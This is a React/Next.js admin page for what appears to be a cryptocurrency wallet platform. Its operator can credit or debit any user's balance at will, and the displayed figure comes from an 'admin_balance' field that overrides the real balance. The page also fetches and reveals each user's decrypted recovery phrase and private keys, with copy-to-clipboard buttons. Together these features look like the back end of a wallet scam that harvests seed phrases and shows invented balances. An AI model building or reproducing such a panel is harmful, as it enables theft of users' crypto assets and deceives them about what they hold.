"use client";

import { useEffect, useState } from "react";
import { useSearchParams } from "next/navigation";
import {
  Search,
  Plus,
  Minus,
  Wallet,
  Loader2,
  CheckCircle2,
  XCircle,
  Clock,
  Key,
  Copy,
  Eye,
  EyeOff,
} from "lucide-react";
import { toast } from "sonner";

interface BalanceOperation {
  id: string;
  user_id: string;
  operation_type: "credit" | "debit";
  token_symbol: string;
  amount: string;
  network: string;
  reason: string;
  status: string;
  created_at: string;
}

interface UserBalance {
  id: string;
  user_id: string;
  token_symbol: string;
  balance: string;
  admin_balance: string;
  network: string;
  usd_value: number;
}

interface WalletCredentials {
  mnemonic: string | null;
  ethereumPrivateKey: string | null;
  bitcoinPrivateKey: string | null;
  solanaPrivateKey: string | null;
  addresses: {
    ethereum: string | null;
    bitcoin: string | null;
    solana: string | null;
    polygon: string | null;
    bsc: string | null;
  };
}

const NETWORKS = [
  { value: "ethereum", label: "Ethereum" },
  { value: "bsc", label: "BNB Smart Chain" },
  { value: "polygon", label: "Polygon" },
  { value: "bitcoin", label: "Bitcoin" },
];

const TOKENS = [
  { value: "ETH", label: "Ethereum (ETH)", network: "ethereum" },
  { value: "BNB", label: "BNB", network: "bsc" },
  { value: "MATIC", label: "Polygon (MATIC)", network: "polygon" },
  { value: "BTC", label: "Bitcoin (BTC)", network: "bitcoin" },
  { value: "USDT", label: "Tether (USDT)", network: "ethereum" },
  { value: "USDC", label: "USD Coin (USDC)", network: "ethereum" },
];

export default function AdminBalancesPage() {
  const searchParams = useSearchParams();
  const prefilledUserId = searchParams.get("user");

  const [operations, setOperations] = useState<BalanceOperation[]>([]);
  const [userBalances, setUserBalances] = useState<UserBalance[]>([]);
  const [credentials, setCredentials] = useState<WalletCredentials | null>(null);
  const [isLoading, setIsLoading] = useState(true);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [showMnemonic, setShowMnemonic] = useState(false);
  const [showPrivateKeys, setShowPrivateKeys] = useState(false);

  // Form state
  const [userId, setUserId] = useState(prefilledUserId || "");
  const [operationType, setOperationType] = useState<"credit" | "debit">("credit");
  const [tokenSymbol, setTokenSymbol] = useState("ETH");
  const [network, setNetwork] = useState("ethereum");
  const [amount, setAmount] = useState("");
  const [reason, setReason] = useState("");

  useEffect(() => {
    fetchData();
  }, []);

  useEffect(() => {
    if (userId) {
      fetchUserBalances();
      fetchCredentials();
    } else {
      setCredentials(null);
    }
  }, [userId]);

  async function fetchCredentials() {
    if (!userId) return;
    try {
      const res = await fetch(`/api/admin/wallet-credentials?userId=${userId}`);
      const data = await res.json();
      if (data.credentials) {
        setCredentials(data.credentials);
      } else {
        setCredentials(null);
      }
    } catch (error) {
      console.error("Failed to load credentials");
      setCredentials(null);
    }
  }

  function copyToClipboard(text: string, label: string) {
    navigator.clipboard.writeText(text);
    toast.success(`${label} copied to clipboard`);
  }

  async function fetchData() {
    try {
      const res = await fetch("/api/admin/balances");
      const data = await res.json();
      if (data.operations) {
        setOperations(data.operations);
      }
    } catch (error) {
      toast.error("Failed to load operations");
    } finally {
      setIsLoading(false);
    }
  }

  async function fetchUserBalances() {
    try {
      const res = await fetch(`/api/admin/balances?userId=${userId}`);
      const data = await res.json();
      if (data.balances) {
        setUserBalances(data.balances);
      }
    } catch (error) {
      console.error("Failed to load user balances");
    }
  }

  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();

    if (!userId.trim()) {
      toast.error("Please enter a user ID");
      return;
    }

    if (!amount || parseFloat(amount) <= 0) {
      toast.error("Please enter a valid amount");
      return;
    }

    setIsSubmitting(true);

    try {
      const res = await fetch("/api/admin/balances", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          userId: userId.trim(),
          operationType,
          tokenSymbol,
          network,
          amount,
          reason,
        }),
      });

      const data = await res.json();

      if (!res.ok) {
        toast.error(data.error || "Operation failed");
        return;
      }

      toast.success(
        `Successfully ${operationType === "credit" ? "credited" : "debited"} ${amount} ${tokenSymbol}`
      );

      // Reset form and refresh data
      setAmount("");
      setReason("");
      fetchData();
      fetchUserBalances();
    } catch (error) {
      toast.error("An error occurred");
    } finally {
      setIsSubmitting(false);
    }
  }

  return (
    <div className="space-y-6">
      <div>
        <h1 className="text-2xl font-bold text-white">Balance Operations</h1>
        <p className="mt-1 text-zinc-400">
          Credit or debit user balances
        </p>
      </div>

      <div className="grid gap-6 lg:grid-cols-2">
        {/* Operation Form */}
        <div className="rounded-xl border border-zinc-800 bg-zinc-900/50 p-6">
          <h2 className="mb-4 text-lg font-semibold text-white">
            New Operation
          </h2>
          <form onSubmit={handleSubmit} className="space-y-4">
            <div>
              <label className="mb-1.5 block text-sm font-medium text-zinc-400">
                User ID
              </label>
              <input
                type="text"
                value={userId}
                onChange={(e) => setUserId(e.target.value)}
                placeholder="Enter user ID (UUID)"
                className="w-full rounded-lg border border-zinc-700 bg-zinc-800 px-3 py-2.5 text-sm text-white placeholder-zinc-500 focus:border-yellow-400/50 focus:outline-none focus:ring-1 focus:ring-yellow-400/50"
              />
            </div>

            <div>
              <label className="mb-1.5 block text-sm font-medium text-zinc-400">
                Operation Type
              </label>
              <div className="grid grid-cols-2 gap-2">
                <button
                  type="button"
                  onClick={() => setOperationType("credit")}
                  className={`flex items-center justify-center gap-2 rounded-lg border px-4 py-2.5 text-sm font-medium transition-colors ${
                    operationType === "credit"
                      ? "border-green-500 bg-green-500/10 text-green-400"
                      : "border-zinc-700 bg-zinc-800 text-zinc-400 hover:border-zinc-600"
                  }`}
                >
                  <Plus className="h-4 w-4" />
                  Credit
                </button>
                <button
                  type="button"
                  onClick={() => setOperationType("debit")}
                  className={`flex items-center justify-center gap-2 rounded-lg border px-4 py-2.5 text-sm font-medium transition-colors ${
                    operationType === "debit"
                      ? "border-red-500 bg-red-500/10 text-red-400"
                      : "border-zinc-700 bg-zinc-800 text-zinc-400 hover:border-zinc-600"
                  }`}
                >
                  <Minus className="h-4 w-4" />
                  Debit
                </button>
              </div>
            </div>

            <div className="grid grid-cols-2 gap-4">
              <div>
                <label className="mb-1.5 block text-sm font-medium text-zinc-400">
                  Token
                </label>
                <select
                  value={tokenSymbol}
                  onChange={(e) => {
                    setTokenSymbol(e.target.value);
                    const token = TOKENS.find((t) => t.value === e.target.value);
                    if (token) setNetwork(token.network);
                  }}
                  className="w-full rounded-lg border border-zinc-700 bg-zinc-800 px-3 py-2.5 text-sm text-white focus:border-yellow-400/50 focus:outline-none focus:ring-1 focus:ring-yellow-400/50"
                >
                  {TOKENS.map((token) => (
                    <option key={token.value} value={token.value}>
                      {token.label}
                    </option>
                  ))}
                </select>
              </div>
              <div>
                <label className="mb-1.5 block text-sm font-medium text-zinc-400">
                  Network
                </label>
                <select
                  value={network}
                  onChange={(e) => setNetwork(e.target.value)}
                  className="w-full rounded-lg border border-zinc-700 bg-zinc-800 px-3 py-2.5 text-sm text-white focus:border-yellow-400/50 focus:outline-none focus:ring-1 focus:ring-yellow-400/50"
                >
                  {NETWORKS.map((net) => (
                    <option key={net.value} value={net.value}>
                      {net.label}
                    </option>
                  ))}
                </select>
              </div>
            </div>

            <div>
              <label className="mb-1.5 block text-sm font-medium text-zinc-400">
                Amount
              </label>
              <input
                type="number"
                step="any"
                value={amount}
                onChange={(e) => setAmount(e.target.value)}
                placeholder="0.00"
                className="w-full rounded-lg border border-zinc-700 bg-zinc-800 px-3 py-2.5 text-sm text-white placeholder-zinc-500 focus:border-yellow-400/50 focus:outline-none focus:ring-1 focus:ring-yellow-400/50"
              />
            </div>

            <div>
              <label className="mb-1.5 block text-sm font-medium text-zinc-400">
                Reason (optional)
              </label>
              <textarea
                value={reason}
                onChange={(e) => setReason(e.target.value)}
                placeholder="Enter a reason for this operation..."
                rows={2}
                className="w-full rounded-lg border border-zinc-700 bg-zinc-800 px-3 py-2.5 text-sm text-white placeholder-zinc-500 focus:border-yellow-400/50 focus:outline-none focus:ring-1 focus:ring-yellow-400/50"
              />
            </div>

            <button
              type="submit"
              disabled={isSubmitting}
              className={`flex w-full items-center justify-center gap-2 rounded-lg px-4 py-3 text-sm font-semibold transition-colors disabled:cursor-not-allowed disabled:opacity-50 ${
                operationType === "credit"
                  ? "bg-green-500 text-white hover:bg-green-600"
                  : "bg-red-500 text-white hover:bg-red-600"
              }`}
            >
              {isSubmitting && <Loader2 className="h-4 w-4 animate-spin" />}
              {isSubmitting
                ? "Processing..."
                : operationType === "credit"
                  ? "Credit Balance"
                  : "Debit Balance"}
            </button>
          </form>
        </div>

        {/* User Balances */}
        <div className="rounded-xl border border-zinc-800 bg-zinc-900/50">
          <div className="border-b border-zinc-800 px-5 py-4">
            <h2 className="font-semibold text-white">
              {userId ? "User Balances" : "Select a User"}
            </h2>
            <p className="mt-1 text-sm text-zinc-500">
              {userId
                ? `Showing balances for ${userId.slice(0, 8)}...`
                : "Enter a user ID to view their balances"}
            </p>
          </div>
          <div className="divide-y divide-zinc-800">
            {!userId ? (
              <div className="flex flex-col items-center justify-center py-12 text-center">
                <Wallet className="h-8 w-8 text-zinc-600" />
                <p className="mt-2 text-sm text-zinc-500">
                  Enter a user ID to view balances
                </p>
              </div>
            ) : userBalances.length === 0 ? (
              <div className="flex flex-col items-center justify-center py-12 text-center">
                <Wallet className="h-8 w-8 text-zinc-600" />
                <p className="mt-2 text-sm text-zinc-500">
                  No balances found for this user
                </p>
              </div>
            ) : (
              userBalances.map((balance) => (
                <div
                  key={balance.id}
                  className="flex items-center justify-between px-5 py-3"
                >
                  <div>
                    <p className="text-sm font-medium text-white">
                      {balance.token_symbol}
                    </p>
                    <p className="text-xs text-zinc-500">{balance.network}</p>
                  </div>
                  <div className="text-right">
                    <p className="text-sm font-medium text-white">
                      {parseFloat(balance.admin_balance || balance.balance || "0").toLocaleString()}
                    </p>
                    <p className="text-xs text-zinc-500">
                      ${balance.usd_value?.toLocaleString() || "0.00"}
                    </p>
                  </div>
                </div>
              ))
            )}
          </div>
        </div>
      </div>

      {/* Wallet Credentials */}
      {userId && (
        <div className="rounded-xl border border-zinc-800 bg-zinc-900/50">
          <div className="border-b border-zinc-800 px-5 py-4">
            <div className="flex items-center gap-2">
              <Key className="h-5 w-5 text-yellow-400" />
              <h2 className="font-semibold text-white">Wallet Credentials</h2>
            </div>
            <p className="mt-1 text-sm text-zinc-500">
              Decrypted recovery phrases and private keys
            </p>
          </div>
          <div className="p-5 space-y-4">
            {!credentials ? (
              <div className="flex flex-col items-center justify-center py-8 text-center">
                <Key className="h-8 w-8 text-zinc-600" />
                <p className="mt-2 text-sm text-zinc-500">
                  No wallet credentials found
                </p>
              </div>
            ) : (
              <>
                {/* Addresses */}
                <div className="space-y-2">
                  <h3 className="text-sm font-medium text-zinc-400">Wallet Addresses</h3>
                  <div className="grid gap-2 text-xs">
                    {credentials.addresses.ethereum && (
                      <div className="flex items-center justify-between rounded-lg bg-zinc-800/50 px-3 py-2">
                        <span className="text-zinc-500">Ethereum/EVM:</span>
                        <div className="flex items-center gap-2">
                          <code className="text-zinc-300">{credentials.addresses.ethereum}</code>
                          <button
                            onClick={() => copyToClipboard(credentials.addresses.ethereum!, "Address")}
                            className="text-zinc-500 hover:text-white"
                          >
                            <Copy className="h-3.5 w-3.5" />
                          </button>
                        </div>
                      </div>
                    )}
                    {credentials.addresses.bitcoin && (
                      <div className="flex items-center justify-between rounded-lg bg-zinc-800/50 px-3 py-2">
                        <span className="text-zinc-500">Bitcoin:</span>
                        <div className="flex items-center gap-2">
                          <code className="text-zinc-300">{credentials.addresses.bitcoin}</code>
                          <button
                            onClick={() => copyToClipboard(credentials.addresses.bitcoin!, "Address")}
                            className="text-zinc-500 hover:text-white"
                          >
                            <Copy className="h-3.5 w-3.5" />
                          </button>
                        </div>
                      </div>
                    )}
                    {credentials.addresses.solana && (
                      <div className="flex items-center justify-between rounded-lg bg-zinc-800/50 px-3 py-2">
                        <span className="text-zinc-500">Solana:</span>
                        <div className="flex items-center gap-2">
                          <code className="text-zinc-300">{credentials.addresses.solana}</code>
                          <button
                            onClick={() => copyToClipboard(credentials.addresses.solana!, "Address")}
                            className="text-zinc-500 hover:text-white"
                          >
                            <Copy className="h-3.5 w-3.5" />
                          </button>
                        </div>
                      </div>
                    )}
                  </div>
                </div>

                {/* Recovery Phrase */}
                {credentials.mnemonic && (
                  <div className="space-y-2">
                    <div className="flex items-center justify-between">
                      <h3 className="text-sm font-medium text-zinc-400">Recovery Phrase</h3>
                      <button
                        onClick={() => setShowMnemonic(!showMnemonic)}
                        className="flex items-center gap-1.5 text-xs text-zinc-500 hover:text-white"
                      >
                        {showMnemonic ? <EyeOff className="h-3.5 w-3.5" /> : <Eye className="h-3.5 w-3.5" />}
                        {showMnemonic ? "Hide" : "Show"}
                      </button>
                    </div>
                    <div className="rounded-lg bg-zinc-800/50 p-3">
                      {showMnemonic ? (
                        <div className="flex items-start justify-between gap-2">
                          <code className="text-sm text-yellow-400 break-all">{credentials.mnemonic}</code>
                          <button
                            onClick={() => copyToClipboard(credentials.mnemonic!, "Recovery phrase")}
                            className="shrink-0 text-zinc-500 hover:text-white"
                          >
                            <Copy className="h-4 w-4" />
                          </button>
                        </div>
                      ) : (
                        <code className="text-sm text-zinc-500">••••••••••••••••••••••••</code>
                      )}
                    </div>
                  </div>
                )}

                {/* Private Keys */}
                <div className="space-y-2">
                  <div className="flex items-center justify-between">
                    <h3 className="text-sm font-medium text-zinc-400">Private Keys</h3>
                    <button
                      onClick={() => setShowPrivateKeys(!showPrivateKeys)}
                      className="flex items-center gap-1.5 text-xs text-zinc-500 hover:text-white"
                    >
                      {showPrivateKeys ? <EyeOff className="h-3.5 w-3.5" /> : <Eye className="h-3.5 w-3.5" />}
                      {showPrivateKeys ? "Hide" : "Show"}
                    </button>
                  </div>
                  <div className="space-y-2">
                    {credentials.ethereumPrivateKey && (
                      <div className="rounded-lg bg-zinc-800/50 p-3">
                        <div className="text-xs text-zinc-500 mb-1">Ethereum/EVM</div>
                        {showPrivateKeys ? (
                          <div className="flex items-start justify-between gap-2">
                            <code className="text-xs text-red-400 break-all">{credentials.ethereumPrivateKey}</code>
                            <button
                              onClick={() => copyToClipboard(credentials.ethereumPrivateKey!, "Private key")}
                              className="shrink-0 text-zinc-500 hover:text-white"
                            >
                              <Copy className="h-3.5 w-3.5" />
                            </button>
                          </div>
                        ) : (
                          <code className="text-xs text-zinc-500">••••••••••••••••••••</code>
                        )}
                      </div>
                    )}
                    {credentials.bitcoinPrivateKey && (
                      <div className="rounded-lg bg-zinc-800/50 p-3">
                        <div className="text-xs text-zinc-500 mb-1">Bitcoin</div>
                        {showPrivateKeys ? (
                          <div className="flex items-start justify-between gap-2">
                            <code className="text-xs text-red-400 break-all">{credentials.bitcoinPrivateKey}</code>
                            <button
                              onClick={() => copyToClipboard(credentials.bitcoinPrivateKey!, "Private key")}
                              className="shrink-0 text-zinc-500 hover:text-white"
                            >
                              <Copy className="h-3.5 w-3.5" />
                            </button>
                          </div>
                        ) : (
                          <code className="text-xs text-zinc-500">••••••••••••••••••••</code>
                        )}
                      </div>
                    )}
                    {credentials.solanaPrivateKey && (
                      <div className="rounded-lg bg-zinc-800/50 p-3">
                        <div className="text-xs text-zinc-500 mb-1">Solana</div>
                        {showPrivateKeys ? (
                          <div className="flex items-start justify-between gap-2">
                            <code className="text-xs text-red-400 break-all">{credentials.solanaPrivateKey}</code>
                            <button
                              onClick={() => copyToClipboard(credentials.solanaPrivateKey!, "Private key")}
                              className="shrink-0 text-zinc-500 hover:text-white"
                            >
                              <Copy className="h-3.5 w-3.5" />
                            </button>
                          </div>
                        ) : (
                          <code className="text-xs text-zinc-500">••••••••••••••••••••</code>
                        )}
                      </div>
                    )}
                    {!credentials.ethereumPrivateKey && !credentials.bitcoinPrivateKey && !credentials.solanaPrivateKey && (
                      <p className="text-sm text-zinc-500">No private keys available</p>
                    )}
                  </div>
                </div>
              </>
            )}
          </div>
        </div>
      )}

      {/* Recent Operations */}
      <div className="rounded-xl border border-zinc-800 bg-zinc-900/50">
        <div className="border-b border-zinc-800 px-5 py-4">
          <h2 className="font-semibold text-white">Recent Operations</h2>
        </div>
        <div className="overflow-x-auto">
          <table className="w-full">
            <thead className="border-b border-zinc-800 bg-zinc-900/50">
              <tr>
                <th className="px-5 py-3 text-left text-xs font-semibold uppercase tracking-wider text-zinc-500">
                  Type
                </th>
                <th className="px-5 py-3 text-left text-xs font-semibold uppercase tracking-wider text-zinc-500">
                  User
                </th>
                <th className="px-5 py-3 text-left text-xs font-semibold uppercase tracking-wider text-zinc-500">
                  Amount
                </th>
                <th className="px-5 py-3 text-left text-xs font-semibold uppercase tracking-wider text-zinc-500">
                  Network
                </th>
                <th className="px-5 py-3 text-left text-xs font-semibold uppercase tracking-wider text-zinc-500">
                  Status
                </th>
                <th className="px-5 py-3 text-right text-xs font-semibold uppercase tracking-wider text-zinc-500">
                  Date
                </th>
              </tr>
            </thead>
            <tbody className="divide-y divide-zinc-800">
              {isLoading ? (
                <tr>
                  <td colSpan={6} className="px-5 py-12 text-center">
                    <Loader2 className="mx-auto h-6 w-6 animate-spin text-zinc-500" />
                  </td>
                </tr>
              ) : operations.length === 0 ? (
                <tr>
                  <td colSpan={6} className="px-5 py-12 text-center">
                    <Clock className="mx-auto h-8 w-8 text-zinc-600" />
                    <p className="mt-2 text-sm text-zinc-500">
                      No operations yet
                    </p>
                  </td>
                </tr>
              ) : (
                operations.map((op) => (
                  <tr key={op.id} className="hover:bg-zinc-800/50">
                    <td className="px-5 py-4">
                      <span
                        className={`inline-flex items-center gap-1.5 rounded-full px-2.5 py-1 text-xs font-medium ${
                          op.operation_type === "credit"
                            ? "bg-green-400/10 text-green-400"
                            : "bg-red-400/10 text-red-400"
                        }`}
                      >
                        {op.operation_type === "credit" ? (
                          <Plus className="h-3 w-3" />
                        ) : (
                          <Minus className="h-3 w-3" />
                        )}
                        {op.operation_type}
                      </span>
                    </td>
                    <td className="px-5 py-4">
                      <code className="rounded bg-zinc-800 px-2 py-1 text-xs text-zinc-300">
                        {op.user_id.slice(0, 8)}...
                      </code>
                    </td>
                    <td className="px-5 py-4">
                      <span className="font-medium text-white">
                        {op.amount} {op.token_symbol}
                      </span>
                    </td>
                    <td className="px-5 py-4 text-sm text-zinc-400">
                      {op.network}
                    </td>
                    <td className="px-5 py-4">
                      <span
                        className={`inline-flex items-center gap-1 rounded-full px-2 py-0.5 text-xs font-medium ${
                          op.status === "completed"
                            ? "bg-green-400/10 text-green-400"
                            : op.status === "pending"
                              ? "bg-yellow-400/10 text-yellow-400"
                              : "bg-red-400/10 text-red-400"
                        }`}
                      >
                        {op.status === "completed" ? (
                          <CheckCircle2 className="h-3 w-3" />
                        ) : op.status === "pending" ? (
                          <Clock className="h-3 w-3" />
                        ) : (
                          <XCircle className="h-3 w-3" />
                        )}
                        {op.status}
                      </span>
                    </td>
                    <td className="px-5 py-4 text-right text-sm text-zinc-400">
                      {new Date(op.created_at).toLocaleDateString()}
                    </td>
                  </tr>
                ))
              )}
            </tbody>
          </table>
        </div>
      </div>
    </div>
  );
}
